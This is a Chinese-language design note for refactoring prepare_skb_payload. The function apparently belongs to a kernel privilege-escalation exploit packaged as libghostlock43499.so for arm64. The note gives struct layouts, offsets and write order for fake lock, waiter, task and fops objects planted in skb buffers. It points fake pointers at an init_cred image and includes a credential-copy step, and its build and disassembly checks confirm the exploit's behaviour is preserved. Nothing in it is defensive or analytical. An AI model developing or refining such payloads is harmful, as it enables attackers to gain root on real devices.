# S5 设计：prepare_skb_payload 拆分（2026-10-21）

> 从属 [split-large-functions](../plan/split-large-functions.md) S5。目标：~142 行 → 小函数；不改 offset/写入顺序/cred copy。

## 几何

```c
struct payload_geometry {
  int tcp;
  int compact;
  int custom_write;
  int child_node;
  uintptr_t custom_target;
  uintptr_t payload_base;
  size_t chunk_bias;
  size_t fake_task_off;
};
```

## 拆分

```c
static void payload_geometry(Glk43499Session *s, const GlkWriteRequest *req,
                             uintptr_t base, struct payload_geometry *g);
static void payload_init_fake(Glk43499Session *s, const struct payload_geometry *g);
static void payload_write_waiter(Glk43499Session *s, unsigned char *p,
                                 const struct payload_geometry *g);
static int  payload_write_task(Glk43499Session *s, unsigned char *p,
                               const struct payload_geometry *g);
```

### payload_geometry

```text
tcp = tcp_route_selected(&s->target.offsets)
payload_delta = tcp ? 0 : SKB_DATA_DELTA
chunk_bias = tcp ? 0xe80 : SKB_FRAG_BIAS
fake_task_off = tcp ? TCP_FAKE_TASK_OFF : FAKE_TASK_OFF
payload_base = base + payload_delta
compact = t->compact_waiter
custom_write = req->mode; child_node = req->preserve_child; custom_target = req->target
```

### payload_init_fake

保持原赋值顺序：

```text
fake_lock = payload_base + LOCK_OFF
fake_w0 = payload_base + W0_OFF
fake_task = payload_base + fake_task_off
fake_fops = payload_base + FOPS_TABLE_OFF
```

custom：

- child_node + mode2 → fake_right = data_addr(init_cred_image)
- child_node + mode1 → fake_right = base + 0x100
- leaf → fake_right = 0
- fake_left = 0
- mode2 → fake_fops = payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF)
- fake_parent = custom_target - 8

### payload_write_waiter

每个 chunk 写：

1. LOCK_OFF +0x00/0x08/0x10/0x18（fake_w0/fake_task|1）
2. compact：W0 +0x00..0x50，包含 tcp/custom_target 分支
3. 6.6：W0 +0x00..WW_CTX
4. 不变 `write_pc/right/left`、`waiter_task/init_task/root_task_group`

### payload_write_task

1. 计算 ft_* offsets（compact 用 t->task_*，否则 target.h）
2. fake_task usage/prio/nprio/pi_lock/pi_waiters/task_group/pi_top/pi_blocked
3. RIGHT/LEFT 三字
4. mode>=2 →
   `fill_profile_cred_copy(&s->target, p, g->tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF)`；
   失败返回 0。偏移必须由 helper 内 tcp 分支决定，不能由调用方另算。

## 编排

```c
memset(skb_buf,0,SKB_SEND_SIZE);
payload_geometry
payload_init_fake
for chunk:
  p = skb_buf + chunk + chunk_bias
  payload_write_waiter
  if (!payload_write_task) return 0
return 1
```

## 风险

- `chunk_bias` 只用于 p 起点，不改变 chunk 步长 ORDER3_SIZE。
- `fake_task_off` 同时用于 fake_task 指针和写入。
- compact tcp + write_right 分支保持：W0+0x18=write_right、+0x20=0、+0x28=custom_target。
- cred copy 失败必须返回 0，不能继续下一个 chunk。
- 不改变 `rt->fake_*` 的赋值时机（循环前一次）。

## 门禁

```text
build 0 warnings
python3 tools/important_flatten.py \
  build/native/baseline-20261021/libghostlock43499.so \
  build/app/intermediates/cxx/Debug/12l21261/obj/arm64-v8a/libghostlock43499.so \
  --parent prepare_skb_payload \
  --helper payload_geometry --helper payload_init_fake \
  --helper payload_write_waiter --helper payload_write_task
# COUNT/ORDER PASS；args_diff 仅报告
cmp_disasm --important-only：无新增 COUNT/ORDER FAIL
llvm-nm b/B=0
```
